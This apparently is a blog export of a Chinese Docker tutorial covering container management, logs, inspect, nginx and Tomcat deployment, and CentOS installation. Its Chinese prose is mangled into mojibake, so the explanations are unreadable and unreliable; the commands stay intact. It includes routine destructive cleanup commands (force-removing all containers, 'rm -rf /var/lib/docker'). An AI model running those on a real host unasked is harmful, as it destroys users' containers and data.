å®¹å™¨å/id(å·²ç»åœæ­¢çš„å®¹å™¨) 4ã€è¿›å…¥å½“å‰æ­£åœ¨è¿è¡Œçš„å®¹å™¨&emsp;&emsp;docker attach å®¹å™¨id #ä»å‰å°è¿›å…¥å®¹å™¨ï¼ˆè¿›å…¥åexité€€å‡ºäº†å°±ä¼šæ€æ­»å®¹å™¨ï¼‰ &emsp;&emsp;docker exec -it å®¹å™¨id bash #ä»åé—¨è¿›å…¥å®¹å™¨ï¼ˆè¿›å…¥åexité€€å‡ºäº†åªæ˜¯é€€å‡ºäº†bashï¼Œå¹¶ä¸ä¼šæ€æ­»å®¹å™¨ï¼‰ #æˆ‘ä»¬é€šå¸¸å®¹å™¨éƒ½æ˜¯ä½¿ç”¨åå°æ–¹å¼è¿è¡Œçš„ï¼Œéœ€è¦è¿›å…¥å®¹å™¨ï¼Œä¿®æ”¹ä¸€äº›é…ç½®#å‘½ä»¤docker exec -it å®¹å™¨id bashshell#æ–¹æ³•ä¸€[root@VM-0-15-centos ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES4519755902f9 centos &quot;/bin/bash&quot; 3 minutes ago Up 3 minutes charming_mendeleev[root@VM-0-15-centos ~]# docker exec -it 4519755902f9 bash[root@4519755902f9 /]# ps -efUID PID PPID C STIME TTY TIME CMDroot 1 0 0 12:49 pts/0 00:00:00 /bin/bashroot 15 0 0 12:54 pts/1 00:00:00 bashroot 29 15 0 12:54 pts/1 00:00:00 ps -ef[root@4519755902f9 /]# exitexit[root@VM-0-15-centos ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES4519755902f9 centos &quot;/bin/bash&quot; 6 minutes ago Up 6 minutes charming_mendeleev#æ–¹æ³•äºŒ[root@VM-0-15-centos ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES4519755902f9 centos &quot;/bin/bash&quot; 6 minutes ago Up 6 minutes charming_mendeleev[root@VM-0-15-centos ~]# docker attach 4519755902f9[root@4519755902f9 /]# exitexit[root@VM-0-15-centos ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES#docker exec #è¿›å…¥å®¹å™¨åå¼€å¯ä¸€ä¸ªæ–°çš„ç»ˆç«¯ï¼Œå¯ä»¥åœ¨é‡Œé¢æ“ä½œï¼ˆå¸¸ç”¨ï¼‰#docker attach #è¿›å…¥å®¹å™¨æ­£åœ¨æ‰§è¡Œçš„ç»ˆç«¯ï¼Œä¸ä¼šå¯åŠ¨æ–°çš„ç»ˆç«¯ 5ã€å¯åŠ¨å’Œåœæ­¢å®¹å™¨çš„æ“ä½œdocker start å®¹å™¨id #å¯åŠ¨å®¹å™¨docker restart å®¹å™¨id #é‡å¯å®¹å™¨docker stop å®¹å™¨id #åœæ­¢å½“å‰æ­£åœ¨è¿è¡Œçš„å®¹å™¨docker kill å®¹å™¨id #å¼ºåˆ¶åœæ­¢å½“å‰å®¹å™¨ 6ã€åˆ é™¤å®¹å™¨docker rm å®¹å™¨id #åˆ é™¤æŒ‡å®šçš„å®¹å™¨ï¼Œä¸èƒ½åˆ é™¤æ­£åœ¨è¿è¡Œçš„å®¹å™¨ï¼Œå¦‚æœè¦å¼ºåˆ¶åˆ é™¤rm -fdocker rm -f $(docker ps -aq) #åˆ é™¤æ‰€æœ‰çš„å®¹å™¨docker ps -a -q|xargs docker rm #åˆ é™¤æ‰€æœ‰çš„å®¹å™¨ã€‚xargs å¯ä»¥å°†ç®¡é“æˆ–æ ‡å‡†è¾“å…¥ï¼ˆstdinï¼‰æ•°æ®è½¬ æ¢æˆå‘½ä»¤è¡Œå‚æ•°ï¼Œä¹Ÿèƒ½å¤Ÿä»æ–‡ä»¶çš„è¾“å‡ºä¸­è¯»å–æ•°æ®ã€‚ å››ã€å¸¸ç”¨å…¶ä»–å‘½ä»¤1ã€åå°å¯åŠ¨å®¹å™¨[root@VM-0-15-centos ~]# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES[root@VM-0-15-centos ~]# docker run -d centos629a55e2dcbd2c225fa93496c2c3afdda4fe3ecea978178f638cfc246c573021[root@VM-0-15-centos ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES[root@VM-0-15-centos ~]# docker run -it -d centos4519755902f94979002e9188463dc3684f34f52ee15ce7fc098a1819f618287b[root@VM-0-15-centos ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES4519755902f9 centos &quot;/bin/bash&quot; 3 seconds ago Up 2 seconds charming_mendeleev[root@VM-0-15-centos ~]# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES4519755902f9 centos &quot;/bin/bash&quot; 9 seconds ago Up 8 seconds charming_mendeleev629a55e2dcbd centos &quot;/bin/bash&quot; 25 seconds ago Exited (0) 24 seconds ago elastic_shockley#é—®é¢˜ï¼šdocker pså‘ç°centosåœæ­¢äº†#å¸¸è§çš„å‘ï¼šdockerå®¹å™¨ä½¿ç”¨åå°è¿è¡Œï¼Œå°±å¿…é¡»è¦æœ‰ä¸€ä¸ªå‰å°è¿›ç¨‹ï¼Œdockerå®¹å™¨å¯åŠ¨åï¼Œå¦‚æœå‘ç°è‡ªå·±æ²¡æœ‰æä¾›æœåŠ¡ï¼Œå°±ä¼šç«‹å³åœæ­¢ 2ã€æŸ¥çœ‹æ—¥å¿—&emsp;&emsp;docker logs &emsp;&emsp;è¯­æ³•ï¼šdocker logs [OPTIONS] CONTAINER -f # è·Ÿè¸ªæ—¥å¿—è¾“å‡º â€“since # æ˜¾ç¤ºæŸä¸ªå¼€å§‹æ—¶é—´çš„æ‰€æœ‰æ—¥å¿— -t # æ˜¾ç¤ºæ—¶é—´æˆ³ â€“tail # ä»…åˆ—å‡ºæœ€æ–°Næ¡å®¹å™¨æ—¥å¿— #è·Ÿè¸ªæŸ¥çœ‹å®¹å™¨çš„æ—¥å¿—è¾“å‡º[root@VM-0-15-centos ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES[root@VM-0-15-centos ~]# docker run -it -d centos ping www.docker.com436d7e51cf42977ed7683169d0277fa50719e3b74b379e691324c1f9b65b7d2e[root@VM-0-15-centos ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES436d7e51cf42 centos &quot;ping www.docker.com&quot; 6 seconds ago Up 5 seconds musing_hypatia[root@VM-0-15-centos ~]# docker logs -f -t --tail 10 436d7e51cf422021-08-29T13:03:43.358471450Z 64 bytes from server-65-9-42-78.nrt12.r.cloudfront.net (65.9.42.78): icmp_seq=25 ttl=231 time=130 ms2021-08-29T13:03:44.357885604Z 64 bytes from server-65-9-42-78.nrt12.r.cloudfront.net (65.9.42.78): icmp_seq=26 ttl=231 time=128 ms2021-08-29T13:03:45.360448310Z 64 bytes from server-65-9-42-78.nrt12.r.cloudfront.net (65.9.42.78): icmp_seq=27 ttl=231 time=129 ms2021-08-29T13:03:46.362365414Z 64 bytes from server-65-9-42-78.nrt12.r.cloudfront.net (65.9.42.78): icmp_seq=28 ttl=231 time=129 ms2021-08-29T13:03:49.362508740Z 64 bytes from server-65-9-42-78.nrt12.r.cloudfront.net (65.9.42.78): icmp_seq=31 ttl=231 time=129 ms2021-08-29T13:03:51.364265785Z 64 bytes from server-65-9-42-78.nrt12.r.cloudfront.net (65.9.42.78): icmp_seq=33 ttl=231 time=131 ms2021-08-29T13:03:54.365170137Z 64 bytes from server-65-9-42-78.nrt12.r.cloudfront.net (65.9.42.78): icmp_seq=36 ttl=231 time=131 ms2021-08-29T13:03:56.366807947Z 64 bytes from server-65-9-42-78.nrt12.r.cloudfront.net (65.9.42.78): icmp_seq=38 ttl=231 time=131 ms2021-08-29T13:03:57.366455842Z 64 bytes from server-65-9-42-78.nrt12.r.cloudfront.net (65.9.42.78): icmp_seq=39 ttl=231 time=131 ms2021-08-29T13:03:58.334405609Z 64 bytes from server-65-9-42-78.nrt12.r.cloudfront.net (65.9.42.78): icmp_seq=40 ttl=231 time=97.5 ms 3ã€æŸ¥çœ‹å®¹å™¨ä¸­è¿›ç¨‹ä¿¡æ¯&emsp;&emsp;docker top å®¹å™¨ID [root@VM-0-15-centos ~]# docker top 436d7e51cf42UID PID PPID C STIME TTY TIME CMDroot 5266 5248 0 21:03 pts/0 00:00:00 ping www.docker.com 4ã€æŸ¥çœ‹é•œåƒçš„å…ƒæ•°æ®&emsp;&emsp;docker inspect å®¹å™¨ID #æµ‹è¯•[root@VM-0-15-centos ~]# docker inspect ec6e3fdec8c7[ &#123; &quot;Id&quot;: &quot;ec6e3fdec8c7c01895d7d47a2ab08c93129c9237a7763f295d37b73f4e327095&quot;, &quot;Created&quot;: &quot;2021-08-29T01:53:05.435416978Z&quot;, &quot;Path&quot;: &quot;/bin/bash&quot;, &quot;Args&quot;: [], &quot;State&quot;: &#123; &quot;Status&quot;: &quot;exited&quot;, &quot;Running&quot;: false, &quot;Paused&quot;: false, &quot;Restarting&quot;: false, &quot;OOMKilled&quot;: false, &quot;Dead&quot;: false, &quot;Pid&quot;: 0, &quot;ExitCode&quot;: 0, &quot;Error&quot;: &quot;&quot;, &quot;StartedAt&quot;: &quot;2021-08-29T01:53:05.774289777Z&quot;, &quot;FinishedAt&quot;: &quot;2021-08-29T01:53:05.773591821Z&quot; &#125;, &quot;Image&quot;: &quot;sha256:300e315adb2f96afe5f0b2780b87f28ae95231fe3bdd1e16b9ba606307728f55&quot;, &quot;ResolvConfPath&quot;: &quot;/var/lib/docker/containers/ec6e3fdec8c7c01895d7d47a2ab08c93129c9237a7763f295d37b73f4e327095/resolv.conf&quot;, &quot;HostnamePath&quot;: &quot;/var/lib/docker/containers/ec6e3fdec8c7c01895d7d47a2ab08c93129c9237a7763f295d37b73f4e327095/hostname&quot;, &quot;HostsPath&quot;: &quot;/var/lib/docker/containers/ec6e3fdec8c7c01895d7d47a2ab08c93129c9237a7763f295d37b73f4e327095/hosts&quot;, &quot;LogPath&quot;: &quot;/var/lib/docker/containers/ec6e3fdec8c7c01895d7d47a2ab08c93129c9237a7763f295d37b73f4e327095/ec6e3fdec8c7c01895d7d47a2ab08c93129c9237a7763f295d37b73f4e327095-json.log&quot;, &quot;Name&quot;: &quot;/xenodochial_cartwright&quot;, &quot;RestartCount&quot;: 0, &quot;Driver&quot;: &quot;overlay2&quot;, &quot;Platform&quot;: &quot;linux&quot;, &quot;MountLabel&quot;: &quot;&quot;, &quot;ProcessLabel&quot;: &quot;&quot;, &quot;AppArmorProfile&quot;: &quot;&quot;, &quot;ExecIDs&quot;: null, &quot;HostConfig&quot;: &#123; &quot;Binds&quot;: null, &quot;ContainerIDFile&quot;: &quot;&quot;, &quot;LogConfig&quot;: &#123; &quot;Type&quot;: &quot;json-file&quot;, &quot;Config&quot;: &#123;&#125; &#125;, &quot;NetworkMode&quot;: &quot;default&quot;, &quot;PortBindings&quot;: &#123;&#125;, &quot;RestartPolicy&quot;: &#123; &quot;Name&quot;: &quot;no&quot;, &quot;MaximumRetryCount&quot;: 0 &#125;, &quot;AutoRemove&quot;: false, &quot;VolumeDriver&quot;: &quot;&quot;, &quot;VolumesFrom&quot;: null, &quot;CapAdd&quot;: null, &quot;CapDrop&quot;: null, &quot;CgroupnsMode&quot;: &quot;host&quot;, &quot;Dns&quot;: [], &quot;DnsOptions&quot;: [], &quot;DnsSearch&quot;: [], &quot;ExtraHosts&quot;: null, &quot;GroupAdd&quot;: null, &quot;IpcMode&quot;: &quot;private&quot;, &quot;Cgroup&quot;: &quot;&quot;, &quot;Links&quot;: null, &quot;OomScoreAdj&quot;: 0, &quot;PidMode&quot;: &quot;&quot;, &quot;Privileged&quot;: false, &quot;PublishAllPorts&quot;: false, &quot;ReadonlyRootfs&quot;: false, &quot;SecurityOpt&quot;: null, &quot;UTSMode&quot;: &quot;&quot;, &quot;UsernsMode&quot;: &quot;&quot;, &quot;ShmSize&quot;: 67108864, &quot;Runtime&quot;: &quot;runc&quot;, &quot;ConsoleSize&quot;: [ 0, 0 ], &quot;Isolation&quot;: &quot;&quot;, &quot;CpuShares&quot;: 0, &quot;Memory&quot;: 0, &quot;NanoCpus&quot;: 0, &quot;CgroupParent&quot;: &quot;&quot;, &quot;BlkioWeight&quot;: 0, &quot;BlkioWeightDevice&quot;: [], &quot;BlkioDeviceReadBps&quot;: null, &quot;BlkioDeviceWriteBps&quot;: null, &quot;BlkioDeviceReadIOps&quot;: null, &quot;BlkioDeviceWriteIOps&quot;: null, &quot;CpuPeriod&quot;: 0, &quot;CpuQuota&quot;: 0, &quot;CpuRealtimePeriod&quot;: 0, &quot;CpuRealtimeRuntime&quot;: 0, &quot;CpusetCpus&quot;: &quot;&quot;, &quot;CpusetMems&quot;: &quot;&quot;, &quot;Devices&quot;: [], &quot;DeviceCgroupRules&quot;: null, &quot;DeviceRequests&quot;: null, &quot;KernelMemory&quot;: 0, &quot;KernelMemoryTCP&quot;: 0, &quot;MemoryReservation&quot;: 0, &quot;MemorySwap&quot;: 0, &quot;MemorySwappiness&quot;: null, &quot;OomKillDisable&quot;: false, &quot;PidsLimit&quot;: null, &quot;Ulimits&quot;: null, &quot;CpuCount&quot;: 0, &quot;CpuPercent&quot;: 0, &quot;IOMaximumIOps&quot;: 0, &quot;IOMaximumBandwidth&quot;: 0, &quot;MaskedPaths&quot;: [ &quot;/proc/asound&quot;, &quot;/proc/acpi&quot;, &quot;/proc/kcore&quot;, &quot;/proc/keys&quot;, &quot;/proc/latency_stats&quot;, &quot;/proc/timer_list&quot;, &quot;/proc/timer_stats&quot;, &quot;/proc/sched_debug&quot;, &quot;/proc/scsi&quot;, &quot;/sys/firmware&quot; ], &quot;ReadonlyPaths&quot;: [ &quot;/proc/bus&quot;, &quot;/proc/fs&quot;, &quot;/proc/irq&quot;, &quot;/proc/sys&quot;, &quot;/proc/sysrq-trigger&quot; ] &#125;, &quot;GraphDriver&quot;: &#123; &quot;Data&quot;: &#123; &quot;LowerDir&quot;: &quot;/var/lib/docker/overlay2/9f58829d0c22ab90bee08aa58ddf072e689f795d72c4dfd3b5a95759a11357da-init/diff:/var/lib/docker/overlay2/b298ad9ced6d87c18f01408e96b63e31dbc7ef41c7b5d6a749e54636a7730b15/diff&quot;, &quot;MergedDir&quot;: &quot;/var/lib/docker/overlay2/9f58829d0c22ab90bee08aa58ddf072e689f795d72c4dfd3b5a95759a11357da/merged&quot;, &quot;UpperDir&quot;: &quot;/var/lib/docker/overlay2/9f58829d0c22ab90bee08aa58ddf072e689f795d72c4dfd3b5a95759a11357da/diff&quot;, &quot;WorkDir&quot;: &quot;/var/lib/docker/overlay2/9f58829d0c22ab90bee08aa58ddf072e689f795d72c4dfd3b5a95759a11357da/work&quot; &#125;, &quot;Name&quot;: &quot;overlay2&quot; &#125;, &quot;Mounts&quot;: [], &quot;Config&quot;: &#123; &quot;Hostname&quot;: &quot;ec6e3fdec8c7&quot;, &quot;Domainname&quot;: &quot;&quot;, &quot;User&quot;: &quot;&quot;, &quot;AttachStdin&quot;: false, &quot;AttachStdout&quot;: false, &quot;AttachStderr&quot;: false, &quot;Tty&quot;: false, &quot;OpenStdin&quot;: false, &quot;StdinOnce&quot;: false, &quot;Env&quot;: [ &quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot; ], &quot;Cmd&quot;: [ &quot;/bin/bash&quot; ], &quot;Image&quot;: &quot;centos&quot;, &quot;Volumes&quot;: null, &quot;WorkingDir&quot;: &quot;&quot;, &quot;Entrypoint&quot;: null, &quot;OnBuild&quot;: null, &quot;Labels&quot;: &#123; &quot;org.label-schema.build-date&quot;: &quot;20201204&quot;, &quot;org.label-schema.license&quot;: &quot;GPLv2&quot;, &quot;org.label-schema.name&quot;: &quot;CentOS Base Image&quot;, &quot;org.label-schema.schema-version&quot;: &quot;1.0&quot;, &quot;org.label-schema.vendor&quot;: &quot;CentOS&quot; &#125; &#125;, &quot;NetworkSettings&quot;: &#123; &quot;Bridge&quot;: &quot;&quot;, &quot;SandboxID&quot;: &quot;d3fedfdee8e6f0d6aa83a793c4e3e56ef29086f8e2cb6ecafc6c280c3d103b8f&quot;, &quot;HairpinMode&quot;: false, &quot;LinkLocalIPv6Address&quot;: &quot;&quot;, &quot;LinkLocalIPv6PrefixLen&quot;: 0, &quot;Ports&quot;: &#123;&#125;, &quot;SandboxKey&quot;: &quot;/var/run/docker/netns/d3fedfdee8e6&quot;, &quot;SecondaryIPAddresses&quot;: null, &quot;SecondaryIPv6Addresses&quot;: null, &quot;EndpointID&quot;: &quot;&quot;, &quot;Gateway&quot;: &quot;&quot;, &quot;GlobalIPv6Address&quot;: &quot;&quot;, &quot;GlobalIPv6PrefixLen&quot;: 0, &quot;IPAddress&quot;: &quot;&quot;, &quot;IPPrefixLen&quot;: 0, &quot;IPv6Gateway&quot;: &quot;&quot;, &quot;MacAddress&quot;: &quot;&quot;, &quot;Networks&quot;: &#123; &quot;bridge&quot;: &#123; &quot;IPAMConfig&quot;: null, &quot;Links&quot;: null, &quot;Aliases&quot;: null, &quot;NetworkID&quot;: &quot;115a2351052d4f81bc4d8f1c20f87f29da1d4bb50ae3543e2d8a1675b1630dc1&quot;, &quot;EndpointID&quot;: &quot;&quot;, &quot;Gateway&quot;: &quot;&quot;, &quot;IPAddress&quot;: &quot;&quot;, &quot;IPPrefixLen&quot;: 0, &quot;IPv6Gateway&quot;: &quot;&quot;, &quot;GlobalIPv6Address&quot;: &quot;&quot;, &quot;GlobalIPv6PrefixLen&quot;: 0, &quot;MacAddress&quot;: &quot;&quot;, &quot;DriverOpts&quot;: null &#125; &#125; &#125; &#125;] 5ã€ä»å®¹å™¨å†…æ‹·è´æ–‡ä»¶åˆ°ä¸»æœºä¸Š&emsp;&emsp;docker cp å®¹å™¨ID:å®¹å™¨å†…è·¯å¾„ ä¸»æœºè·¯å¾„ &emsp;&emsp;æ‹·è´æ˜¯ä¸€ä¸ªæ‰‹åŠ¨è¿‡ç¨‹ï¼Œæœªæ¥æˆ‘ä»¬ä½¿ç”¨-vå·çš„æŠ€æœ¯ï¼Œå¯ä»¥å®ç°è‡ªåŠ¨åŒæ­¥ äº”ã€å°ç»“ å…­ã€ç»ƒä¹ 1ã€å®‰è£…éƒ¨ç½²nginx[root@VM-0-15-centos ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES[root@VM-0-15-centos ~]# docker search nginxNAME DESCRIPTION STARS OFFICIAL AUTOMATEDnginx Official build of Nginx. 15385 [OK]jwilder/nginx-proxy Automated Nginx reverse proxy for docker conâ€¦ 2061 [OK]richarvey/nginx-php-fpm Container running Nginx + PHP-FPM capable ofâ€¦ 816 [OK]jc21/nginx-proxy-manager Docker container for managing Nginx proxy hoâ€¦ 237linuxserver/nginx An Nginx container, brought to you by LinuxSâ€¦ 152tiangolo/nginx-rtmp Docker image with Nginx using the nginx-rtmpâ€¦ 140 [OK]jlesage/nginx-proxy-manager Docker container for Nginx Proxy Manager 135 [OK]alfg/nginx-rtmp NGINX, nginx-rtmp-module and FFmpeg from souâ€¦ 105 [OK]jasonrivers/nginx-rtmp Docker images to host RTMP streams using NGIâ€¦ 92 [OK]nginxdemos/hello NGINX webserver that serves a simple page coâ€¦ 71 [OK]privatebin/nginx-fpm-alpine PrivateBin running on an Nginx, php-fpm &amp; Alâ€¦ 56 [OK]nginx/nginx-ingress NGINX and NGINX Plus Ingress Controllers foâ€¦ 55nginxinc/nginx-unprivileged Unprivileged NGINX Dockerfiles 46staticfloat/nginx-certbot Opinionated setup for automatic TLS certs loâ€¦ 24 [OK]nginx/nginx-prometheus-exporter NGINX Prometheus Exporter for NGINX and NGINâ€¦ 19schmunk42/nginx-redirect A very simple container to redirect HTTP traâ€¦ 19 [OK]nginxproxy/nginx-proxy Automated Nginx reverse proxy for docker conâ€¦ 18centos/nginx-112-centos7 Platform for running nginx 1.12 or building â€¦ 15centos/nginx-18-centos7 Platform for running nginx 1.8 or building nâ€¦ 13raulr/nginx-wordpress Nginx front-end for the official wordpress:fâ€¦ 13 [OK]flashspys/nginx-static Super Lightweight Nginx Image 10 [OK]mailu/nginx Mailu nginx frontend 9 [OK]sophos/nginx-vts-exporter Simple server that scrapes Nginx vts stats aâ€¦ 7 [OK]ansibleplaybookbundle/nginx-apb An APB to deploy NGINX 2 [OK]wodby/nginx Generic nginx 1 [OK][root@VM-0-15-centos ~]# docker pull nginxUsing default tag: latestlatest: Pulling from library/nginxe1acddbe380c: Already existse21006f71c6f: Pull completef3341cc17e58: Pull complete2a53fa598ee2: Pull complete12455f71a9b5: Pull completeb86f2ba62d17: Pull completeDigest: sha256:4d4d96ac750af48c6a551d757c1cbfc071692309b491b70b2b8976e102dd3fefStatus: Downloaded newer image for nginx:latestdocker.io/library/nginx:latest[root@VM-0-15-centos ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEnginx latest dd34e67e3371 13 days ago 133MBmysql latest 5a4e492065c7 13 days ago 514MBhello-world latest d1165f221234 5 months ago 13.3kBcentos latest 300e315adb2f 8 months ago 209MB80x86/typecho latest 3437f7346b4c 2 years ago 53.9MB[root@VM-0-15-centos ~]# docker run -d --name nginx01 -p 3344:80 nginxd0850b4943fcd70f14dd895826012a77bdb219b992060fc31fea07d8f5536803[root@VM-0-15-centos ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESd0850b4943fc nginx &quot;/docker-entrypoint.â€¦&quot; 5 seconds ago Up 4 seconds 0.0.0.0:3344-&gt;80/tcp, :::3344-&gt;80/tcp nginx01[root@VM-0-15-centos ~]# curl localhost:3344&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Welcome to nginx!&lt;/title&gt;&lt;style&gt; body &#123; width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;&lt;p&gt;If you see this page, the nginx web server is successfully installed andworking. Further configuration is required.&lt;/p&gt;&lt;p&gt;For online documentation and support please refer to&lt;a href=&quot;http://nginx.org/&quot;&gt;nginx.org&lt;/a&gt;.&lt;br/&gt;Commercial support is available at&lt;a href=&quot;http://nginx.com/&quot;&gt;nginx.com&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 2ã€å®‰è£…éƒ¨ç½²Tomcat#å®˜æ–¹çš„ä½¿ç”¨docker run -it --rm tomcat:9.0#æˆ‘ä»¬ä¹‹å‰çš„å¯åŠ¨éƒ½æ˜¯åå°ï¼Œåœæ­¢äº†å®¹å™¨ä¹‹åï¼Œå®¹å™¨è¿˜æ˜¯å¯ä»¥æŸ¥åˆ° è€Œ--rmä¸€èˆ¬ç”¨æ¥æµ‹è¯•ï¼Œç”¨å®Œå°±åˆ é™¤å®¹å™¨#ä¸‹è½½å†è¿è¡Œ[root@VM-0-15-centos ~]# docker pull tomcat[root@VM-0-15-centos ~]# docker run -d -p 3355:8080 --name tomcat01 tomcat64dc6975f6e47c040b7c476f7a4aa8af43fff314cfc3bcc539da5524b7b1d2c5#æµ‹è¯•è®¿é—®å‘ç°æ‰¾ä¸åˆ°#è¿›å…¥å®¹å™¨[root@VM-0-15-centos ~]# docker exec -it tomcat01 /bin/bashroot@64dc6975f6e4:/usr/local/tomcat# lsBUILDING.txt LICENSE README.md RUNNING.txt conf logs temp webapps.distCONTRIBUTING.md NOTICE RELEASE-NOTES bin lib native-jni-lib webapps workroot@64dc6975f6e4:/usr/local/tomcat# cd webappsroot@64dc6975f6e4:/usr/local/tomcat/webapps# lsroot@64dc6975f6e4:/usr/local/tomcat/webapps##å‘ç°é—®é¢˜ï¼š1ã€Linuxå‘½ä»¤å°‘äº† 2ã€æ²¡æœ‰webapps#é˜¿é‡Œäº‘é•œåƒçš„åŸå› ã€‚é»˜è®¤æ˜¯æœ€å°çš„é•œåƒï¼Œæ‰€æœ‰ä¸å¿…è¦çš„éƒ½å‰”é™¤æ‰#ä¿è¯æœ€å°çš„å¯è¿è¡Œç¯å¢ƒï¼ #ROOTåœ¨webapps.distç›®å½•ä¸‹root@64dc6975f6e4:/usr/local/tomcat# cd webapps.distroot@64dc6975f6e4:/usr/local/tomcat/webapps.dist# lsROOT docs examples host-manager managerroot@64dc6975f6e4:/usr/local/tomcat/webapps.dist# cd ..root@64dc6975f6e4:/usr/local/tomcat# cp -r webapps.dist/* webappsroot@64dc6975f6e4:/usr/local/tomcat##å†æ¬¡æµ‹è¯•ï¼ŒæˆåŠŸ","categories":[{"name":"docker","slug":"docker","permalink":"https://wolke.cn/categories/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://wolke.cn/tags/docker/"}],"author":"w01ke"},{"title":"dockerå®‰è£…","slug":"dockerå®‰è£…","date":"2021-12-09T04:11:26.000Z","updated":"2022-01-03T03:25:48.404Z","comments":true,"path":"post/327177db.html","link":"","permalink":"https://wolke.cn/post/327177db.html","excerpt":"","text":"ä¸€ã€Dockerçš„åŸºæœ¬ç»„æˆ 1ã€é•œåƒï¼ˆimageï¼‰ï¼š &emsp;&emsp;Dockeré•œåƒå°±å¥½æ¯”æ˜¯ä¸€ä¸ªæ¨¡æ¿ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªæ¨¡æ¿æ¥åˆ›å»ºå®¹å™¨æœåŠ¡ï¼ŒTomcaté•œåƒ==&gt;run==&gt;Tomecat01å®¹å™¨ï¼ˆæä¾›æœåŠ¡ï¼‰ï¼Œé€šè¿‡è¿™ä¸ªé•œåƒå¯ä»¥åˆ›å»ºå¤šä¸ªå®¹å™¨ï¼ˆæœ€ç»ˆæœåŠ¡æˆ–è€…é¡¹ç›®è¿è¡Œå°±æ˜¯åœ¨å®¹å™¨ä¸­çš„ 2ã€å®¹å™¨ï¼ˆcontainerï¼‰ï¼š &emsp;&emsp;é€šè¿‡é•œåƒæ¥åˆ›å»ºçš„ &emsp;&emsp;Dockeråˆ©ç”¨å®¹å™¨æŠ€æœ¯ï¼Œç‹¬ç«‹è¿è¡Œä¸€ä¸ªæˆ–è€…ä¸€ç»„åº”ç”¨ &emsp;&emsp;ç›®å‰å°±å¯ä»¥æŠŠè¿™ä¸ªå®¹å™¨ç†è§£ä¸ºå°±æ˜¯ä¸€ä¸ªç®€æ˜“çš„Linuxç³»ç»Ÿ 3ã€ä»“åº“ï¼ˆrepositoryï¼‰ï¼š &emsp;&emsp;ä»“åº“å°±æ˜¯å­˜æ”¾é•œåƒçš„åœ°æ–¹ &emsp;&emsp;ä»“åº“åˆ†ä¸ºå…¬æœ‰ä»“åº“å’Œç§æœ‰ä»“åº“ äºŒã€å®‰è£…Docker1ã€ç¯å¢ƒå‡†å¤‡ éœ€è¦LinuxåŸºç¡€ CentOS7 ä½¿ç”¨XShellç­‰è¿æ¥è¿œç¨‹æœåŠ¡å™¨è¿›è¡Œæ“ä½œ 2ã€ç¯å¢ƒæŸ¥çœ‹&emsp;&emsp;uname -r #å¯ä»¥çœ‹åˆ°ç³»ç»Ÿå†…æ ¸æ˜¯3.0ä»¥ä¸Šçš„ï¼ˆæ ¹æ®ç›®å‰æœ€æ–°ç‰ˆæœ¬çš„Dockeræœ€å¥½ç”¨3.0ä»¥ä¸Šçš„ï¼‰ &emsp;&emsp;cat /etc/os-release #æ“ä½œç³»ç»Ÿç‰ˆæœ¬ç­‰ä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°ä¸ºCentOS7 3ã€å®‰è£…&emsp;&emsp;æŸ¥çœ‹å¸®åŠ©æ–‡æ¡£ ï¼ˆ1ï¼‰å¸è½½æ—§çš„ç‰ˆæœ¬sudo yum remove docker \\ docker-client \\ docker-client-latest \\ docker-common \\ docker-latest \\ docker-latest-logrotate \\ docker-logrotate \\ docker-engine ï¼ˆ2ï¼‰éœ€è¦çš„å®‰è£…åŒ…sudo yum install -y yum-utils ï¼ˆ3ï¼‰è®¾ç½®é•œåƒçš„ä»“åº“sudo yum-config-manager \\ --add-repo \\ https://download.docker.com/linux/centos/docker-ce.repo #é»˜è®¤æ˜¯å›½å¤–çš„#å»ºè®®ç”¨å›½å†…çš„ï¼Œè¿™é‡Œç”¨äº†é˜¿é‡Œäº‘çš„sudo yum-config-manager \\ --add-repo \\ http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo ï¼ˆ4ï¼‰æ›´æ–°yumè½¯ä»¶åŒ…ç´¢å¼•ï¼ˆæ–‡æ¡£å¹¶æ²¡æœ‰ï¼Œä½†æ˜¯æ¨èå…ˆè¿™æ ·åšï¼‰sudo yum makecache fast ï¼ˆ5ï¼‰å®‰è£…Dockerç›¸å…³ä¾èµ–ï¼ˆdocker-ce ç¤¾åŒºç‰ˆ ee ä¼ä¸šç‰ˆï¼‰sudo yum install docker-ce docker-ce-cli containerd.io#å¯ä»¥ä½¿ç”¨docker versionå‘½ä»¤æŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸ ï¼ˆ6ï¼‰å¯åŠ¨Dockersystemctl start docker ï¼ˆ7ï¼‰è¿è¡Œhello-worlddocker run hello-world ï¼ˆ8ï¼‰æŸ¥çœ‹ä¸‹è½½çš„hello-worldé•œåƒdocker images 4ã€å¸è½½Dockerï¼ˆäº†è§£ï¼‰# 1ã€å¸è½½ä¾èµ–sudo yum remove docker-ce docker-ce-cli containerd.io# 2ã€åˆ é™¤èµ„æºsudo rm -rf /var/lib/docker # /var/lib/docker ä¸ºDockerçš„é»˜è®¤å·¥ä½œè·¯å¾„ 